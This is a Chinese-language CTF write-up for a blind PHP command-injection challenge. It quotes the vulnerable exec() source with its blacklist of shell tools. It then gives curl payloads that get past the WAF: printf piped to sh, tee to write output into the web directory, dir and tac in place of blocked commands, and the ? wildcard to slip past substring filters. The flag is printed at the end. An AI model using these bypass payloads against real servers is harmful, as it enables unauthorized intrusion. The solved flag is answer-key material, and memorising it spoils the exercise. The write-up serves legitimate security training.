---
title: "无回显RCE绕过和WAF绕过"
ctf: "NSSCTF"
date: 2026-05-18
category: web
difficulty: medium
flag_format: "NSSCTF{...}"
author: "cyrene"
---

# 无回显RCE绕过和WAF绕过

- **NSSCTF 题号**: [P438](https://www.nssctf.cn/problem/438)
- **题目原名**: [SWPUCTF 2021 新生赛]finalrce
- **题目链接**: https://www.nssctf.cn/problem/438

## Summary

通过分析PHP源码发现`url`参数存在命令注入，但WAF过滤了大量敏感字符与命令，且`exec()`执行结果无回显。利用`sh`配合管道绕过命令过滤，使用`tee`将结果写入Web目录实现回显，最终通过通配符`?`绕过文件名中的`la`黑名单，读取到flag。

## Solution

### Step 1: 源码分析与WAF策略

访问目标URL，直接返回PHP源码：

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))
{
    $url=$_GET['url'];
    if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|"|\>|\<|\%|\$/i',$url))
    {
        echo "Sorry,you can't use this.";
    }
    else
    {
        echo "Can you see anything?";
        exec($url);
    }
}
```

关键限制：
- **命令黑名单**：`bash`, `nc`, `wget`, `ping`, `ls`, `cat`, `more`, `less`, `echo`, `php`, `python`, `mv`, `cp` 等
- **字符黑名单**：`-`, `*`, `"`, `>`, `<`, `%`, `$`
- **无回显**：`exec()` 执行结果不输出到页面

### Step 2: RCE验证与无回显绕过

`sh` 和 `|` 均未被过滤，可通过 `printf 'command' | sh` 构造命令。利用 `sleep` 验证RCE存在：

```bash
curl "http://node4.anna.nssctf.cn:28445/?url=printf%20%27sleep%205%27%20|%20sh"
# 响应耗时约5秒，确认命令执行成功
```

为解决无回显问题，利用 `tee` 命令将执行结果写入Web目录的可访问文件：

```bash
curl "http://node4.anna.nssctf.cn:28445/?url=whoami%20|%20tee%20x.txt"
curl "http://node4.anna.nssctf.cn:28445/x.txt"
# www-data
```

### Step 3: 列目录与定位Flag文件

`ls` 被过滤，使用 `dir` 替代。列根目录发现两个可疑文件：

```bash
curl "http://node4.anna.nssctf.cn:28445/?url=dir%20/%20|%20tee%20x.txt"
curl "http://node4.anna.nssctf.cn:28445/x.txt"
```

输出：
```
a_here_is_a_f1ag  dev		       home   media  proc  sbin  tmp
bin		  etc		       lib    mnt    root  srv	 usr
boot		  flllllaaaaaaggggggg  lib64  opt    run   sys	 var
```

读取提示文件确认真正flag位置：

```bash
curl "http://node4.anna.nssctf.cn:28445/?url=tac%20/a_here_is_a_f1ag%20|%20tee%20x.txt"
curl "http://node4.anna.nssctf.cn:28445/x.txt"
# true_flag_1s_1n_flllllaaaaaaggggggg
```

### Step 4: 通配符绕过文件名黑名单

文件名 `flllllaaaaaaggggggg` 中包含子串 `la`，直接传入会触发WAF。利用 `?` 通配符（单字符匹配）替代其中一个字符，绕过字符串黑名单检测：

```bash
# 原始文件名: flllllaaaaaaggggggg
# 绕过写法:   flllll?aaaaaggggggg
curl "http://node4.anna.nssctf.cn:28445/?url=tac%20/flllll%3Faaaaaggggggg%20|%20tee%20x.txt"
curl "http://node4.anna.nssctf.cn:28445/x.txt"
```

## Flag

```
NSSCTF{d101a8bc-7be7-4511-9bfa-477cc1be8cc5}
```

## 涉及知识点

1. **命令注入无回显绕过**：利用 `tee` 将命令输出写入Web目录可访问文件，替代DNS外带或时间盲注
2. **WAF命令黑名单绕过**：使用功能等价但未被过滤的命令（`dir` 替代 `ls`，`tac`/`head` 替代 `cat`，`printf` 替代 `echo`）
3. **WAF字符/子串黑名单绕过**：利用Shell通配符 `?` 替代被过滤子串中的字符，避免正则字符串匹配命中
4. **Shell管道利用**：`printf 'cmd' | sh | tee file` 构造完整执行链，绕过对 `-` 等选项参数的依赖
